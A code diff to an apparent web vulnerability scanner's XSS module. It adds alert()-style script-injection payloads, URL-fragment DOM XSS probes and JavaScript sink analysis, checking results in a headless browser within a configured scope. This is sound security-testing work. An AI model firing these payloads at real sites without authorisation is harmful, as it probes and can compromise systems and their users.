@@ -14,6 +14,7 @@ Stored XSS:
 Maturity: Level 4 (Verified via browser execution)
 """
 
+import html
 import re
 from typing import Any
 from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse
@@ -28,6 +29,9 @@ from scanners.base import ScannerBase, DetectionResult, ValidationResult
 
 XSS_PAYLOADS = [
     '<svg/onload=alert(1)>',
+    '<svg onload=alert(1)>',
+    "'<svg onload=alert(1)>'",
+    "'<svg onload=confirm(1)>'",
     '"><img src=x onerror=alert(1)>',
     "';alert(1)//",
     '<script>alert(1)</script>',
@@ -35,6 +39,12 @@ XSS_PAYLOADS = [
     "javascript:alert(1)",
     '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
     '<select><option><style></style><img src=x onerror=alert(1)></select>',
+]
+
+DOM_FRAGMENT_PAYLOADS = [
+    '#<script>alert(1)</script>',
+    '#"><img src=x onerror=alert(1)>',
+    '#<svg/onload=alert(1)>',
 ]
 
 STORED_XSS_PAYLOADS = [
@@ -173,6 +183,24 @@ class XSSScanner(ScannerBase):
                     raw_response=resp,
                     evidence_signals=[f"Reflected in {context} context"],
                 )
+
+            content_type = (resp.headers.get('Content-Type', '') or '')
+            if 'text/html' in content_type and payload in resp.text:
+                body = resp.text
+                pos = body.index(payload)
+                before = body[pos-1] if pos > 0 else ''
+                after = body[pos+len(payload)] if pos+len(payload) < len(body) else ''
+                escaped_prefix = body[pos-2:pos] if pos >= 2 else ''
+                in_json = (before == '"' and after == '"') or (escaped_prefix == '\\"' and after == '"')
+                if not in_json:
+                    return DetectionResult(
+                        url=url,
+                        parameter=parameter,
+                        payload=payload,
+                        context="json_reflection",
+                        raw_response=resp,
+                        evidence_signals=["Reflected outside JSON string context in text/html response"],
+                    )
         return None
 
     def _safe_get(self, url: str):
@@ -199,6 +227,20 @@ class XSSScanner(ScannerBase):
 
     def validate(self, detection: DetectionResult) -> dict | None:
         """Validate XSS via headless browser execution."""
+        if detection.context == "json_reflection":
+            resp = detection.raw_response
+            if resp and 'text/html' in resp.headers.get('Content-Type', ''):
+                body = resp.text
+                payload = detection.payload
+                if payload in body:
+                    pos = body.index(payload)
+                    before = body[pos-1] if pos > 0 else ''
+                    after = body[pos+len(payload)] if pos+len(payload) < len(body) else ''
+                    escaped_prefix = body[pos-2:pos] if pos >= 2 else ''
+                    in_json = (before == '"' and after == '"') or (escaped_prefix == '\\"' and after == '"')
+                    if not in_json:
+                        return {"confirmed": True, "method": "json_reflection_context", "alert_fired": False}
+            return {"confirmed": False, "method": "reflection_only", "alert_fired": False}
         payload = detection.payload
         url = detection.url
         parameter = detection.parameter
@@ -247,6 +289,14 @@ class XSSScanner(ScannerBase):
                 body_excerpt=resp.text[:500],
                 body_length=len(resp.text),
             ))
+        if detection.context == "json_reflection":
+            resp = detection.raw_response
+            if resp:
+                ev_list.append(ResponseExcerptEvidence(
+                    excerpt=resp.text[:500],
+                    length=len(resp.text),
+                    context=f"Content-Type: {resp.headers.get('Content-Type', '')} — reflected outside JSON string context",
+                ))
         if validation_result and validation_result.get("alert_fired"):
             ev_list.append(BrowserExecutionEvidence(
                 alert_fired=True,
@@ -363,12 +413,104 @@ class XSSScanner(ScannerBase):
         urls = self.recon.get("urls", []) if target_urls is None else target_urls
         forms = self.recon.get("forms", [])
 
+        # DOM fragment detection
+        for url in urls:
+            if not self._in_scope(url):
+                continue
+            try:
+                base_resp = self._safe_get(url)
+                if not base_resp or not base_resp.text:
+                    continue
+                if not re.search(r'(location\.hash|location\.href|window\.location)', base_resp.text):
+                    continue
+                for fp in DOM_FRAGMENT_PAYLOADS:
+                    frag_url = url + fp
+                    frag_resp = self._safe_get(frag_url)
+                    if not frag_resp or not frag_resp.text:
+                        continue
+                    frag_content = fp.lstrip('#')
+                    if frag_content in frag_resp.text and frag_content in html.unescape(frag_resp.text):
+                        screenshot_dir = self.config.get("output", "reports") + "/screenshots"
+                        browser_ev = self.validation.confirm_browser_xss(
+                            url=frag_url,
+                            payload=frag_content,
+                            screenshot_dir=screenshot_dir,
+                        )
+                        confirmed = browser_ev and (browser_ev.alert_fired or browser_ev.dom_mutation)
+                        from models.evidence import HttpRequestEvidence, BrowserExecutionEvidence
+                        ev_list = [
+                            HttpRequestEvidence(
+                                method="GET",
+                                url=frag_url,
+                                curl_command=_build_curl("GET", frag_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
+                            ),
+                        ]
+                        if browser_ev:
+                            ev_list.append(BrowserExecutionEvidence(
+                                alert_fired=browser_ev.alert_fired,
+                                dom_mutation=browser_ev.dom_mutation,
+                                screenshot_path=browser_ev.screenshot_path or "",
+                                execution_context="goto",
+                            ))
+                        stage = VerificationStage.VERIFIED.value if confirmed else VerificationStage.DETECTED.value
+                        f = finding(
+                            vuln_type="XSS DOM Fragment",
+                            url=url,
+                            severity="high",
+                            details=f"XSS via URL fragment {'executed in browser' if confirmed else 'detected'} — payload '{fp}' reflected unencoded",
+                            evidence=f"Payload: {fp} | Context: dom_fragment | Executed: {confirmed}",
+                            verification_stage=stage,
+                            parameter="fragment",
+                            request=_build_curl("GET", frag_url, dict(self.session.headers), cookies=safe_cookies_dict(self.session.cookies)),
+                            response_excerpt=frag_resp.text[:500] if frag_resp else "",
+                            steps_to_reproduce=[
+                                f"Visit {frag_url}",
+                                "Observe that the fragment payload is reflected unencoded in the response",
+                                "In a real attack, an attacker could craft a URL with a malicious fragment to execute JavaScript",
+                            ],
+                        )
+                        if f:
+                            for ev in ev_list:
+                                self.evidence_engine.store(ev)
+                                self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
+                            signal_stage = VerificationStage.VALIDATED.value if confirmed else VerificationStage.DETECTED.value
+                            self._enrich_finding(f, len(ev_list), signal_stage)
+                            self._add_finding(f)
+                        break
+            except Exception as e:
+                log(f"  [XSS DOM Fragment] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
+
         # Reflected XSS
         for url in urls:
             if not self._in_scope(url):
                 continue
             try:
                 params = list(parse_qs(urlparse(url).query).keys())
+
+                # Recon-driven targeting: prioritize parameters from JS intelligence
+                js_urls = self.recon.get('js_urls', []) or []
+                js_endpoints = self.recon.get('js_endpoints', []) or []
+                if js_urls or js_endpoints:
+                    js_param_priority = set()
+                    js_text = ''
+                    if isinstance(js_urls, list):
+                        for js_url in js_urls:
+                            if isinstance(js_url, str):
+                                r = self._safe_get(js_url)
+                                if r and r.text:
+                                    js_text += r.text + '\n'
+                    if isinstance(js_endpoints, list):
+                        for ep in js_endpoints:
+                            if isinstance(ep, str):
+                                js_text += ep + '\n'
+                    for param in params:
+                        for kw in ('document.write', 'innerHTML', 'eval'):
+                            pattern = rf'{re.escape(kw)}\s*\([^)]*{re.escape(param)}[^)]*\)'
+                            if re.search(pattern, js_text):
+                                js_param_priority.add(param)
+                    if js_param_priority:
+                        params = [p for p in params if p in js_param_priority] + [p for p in params if p not in js_param_priority]
+
                 for param in params:
                     detection = self.detect(url, param)
                     if detection is None:
@@ -396,7 +538,10 @@ class XSSScanner(ScannerBase):
                         for ev in evidence:
                             self.evidence_engine.store(ev)
                             self.evidence_engine.link_to_finding(ev, f.get("fingerprint", ""))
-                        self._enrich_finding(f, len(evidence), f["verification_stage"])
+                        signal_stage = f["verification_stage"]
+                        if detection.context == "json_reflection" and confirmed:
+                            signal_stage = VerificationStage.VALIDATED.value
+                        self._enrich_finding(f, len(evidence), signal_stage)
                         self._add_finding(f)
             except Exception as e:
                 log(f"  [XSS] Error: {e}", Colors.WHITE, verbose_only=True, verbose=self.verbose)
